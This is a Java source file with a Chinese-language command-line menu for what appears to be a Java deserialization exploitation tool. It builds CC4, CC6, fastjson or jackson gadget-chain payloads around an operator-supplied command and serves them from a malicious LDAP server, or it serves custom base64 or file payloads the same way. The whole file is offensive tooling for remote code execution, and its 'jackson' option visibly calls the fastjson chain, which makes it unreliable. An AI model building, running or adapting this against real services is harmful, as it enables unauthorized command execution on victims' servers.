package utools;

import util.CC4;
import util.Gadget;

import java.io.FileInputStream;
import java.util.Base64;
import java.util.Scanner;

import static utools.Service.launchLDAPServer;

public class commendRun {
    static Scanner scanner = new Scanner(System.in);

    public static void cmdRun() throws Exception {
        System.out.println("(s)self模块，可选择加载自定义的base64序列化链或文件\n(g)gadget模块，可使用内置好的序列化链模块");
        System.out.print("请选择你要运行的模块(s/g)：");
        switch (input()) {
            case "s":
                System.out.println("(b)base64模式,可输入你的base64编码后的序列化数据\n(f)File模式，可使用你保存的序列化链的文件");
                System.out.print("请选择你要运行的模块(b/f)：");
                switch (input()){
                    case "b":
                        System.out.println("请输入你要传入的base64数据：");
                        String b64 = new Scanner(System.in).next();
                        System.out.println("请输入你要启动的端口：");
                        int p1 = new Scanner(System.in).nextInt();
                        byte[] decodedBytes = Base64.getDecoder().decode(b64);
                        launchLDAPServer(p1, decodedBytes);
                        break;
                    case "f":
                        System.out.println("请输入你文件的路径：");
                        String filename = new Scanner(System.in).next();
                        System.out.println("请输入你要启动的端口：");
                        int p2 = new Scanner(System.in).nextInt();
                        FileInputStream fis = new FileInputStream(filename);
                        byte[] bytes = new byte[fis.available()];
                        fis.read(bytes);
                        fis.close();
                        launchLDAPServer(p2, bytes);
                        break;
                }
                break;
            case "g":
                System.out.println("(cc4)调用CC4反序列化利用链\n(cc6)调用CC6反序列化利用链\n(fastjson)调用fastjson1.2" +
                        ".83原生反序列化利用链<49-83>\n（jackson)调用jackson反序列化利用链<2.10.*>");
                System.out.print("请选择你要运行的模块(cc4/cc6/fastjson/jackson)：");
                switch (input()){
                    case "cc4":
                        System.out.println("请输入你要执行的命令：");
                        String c1 = new Scanner(System.in).next();
                        byte[] c4 = CC4.cc4(c1);
                        System.out.println("请输入你要监听的端口：");
                        String p1 = new Scanner(System.in).next();
                        launchLDAPServer(Integer.valueOf(p1),c4);
                        break;
                    case "cc6":
                        System.out.println("请输入你要执行的命令：");
                        String c2 = new Scanner(System.in).next();
                        byte[] c6 = Gadget.cc6(c2);
                        System.out.println("请输入你要监听的端口：");
                        String p2 = new Scanner(System.in).next();
                        launchLDAPServer(Integer.valueOf(p2),c6);
                        break;
                    case "fastjson":
                        System.out.println("请输入你要执行的命令：");
                        String c3 = new Scanner(System.in).next();
                        byte[] fs = Gadget.fastjson49_83(c3);
                        System.out.println("请输入你要监听的端口：");
                        String p3 = new Scanner(System.in).next();
                        launchLDAPServer(Integer.valueOf(p3),fs);
                        break;
                    case "jackson":
                        System.out.println("请输入你要执行的命令：");
                        String c5 = new Scanner(System.in).next();
                        byte[] js = Gadget.fastjson49_83(c5);
                        System.out.println("请输入你要监听的端口：");
                        String p4 = new Scanner(System.in).next();
                        launchLDAPServer(Integer.valueOf(p4),js);
                        break;
                }
                break;
            default:
                System.out.println("Invalid input.");
                break;
        }
        scanner.close();
    }
    public static String input(){
        return scanner.next().toLowerCase();
    }

}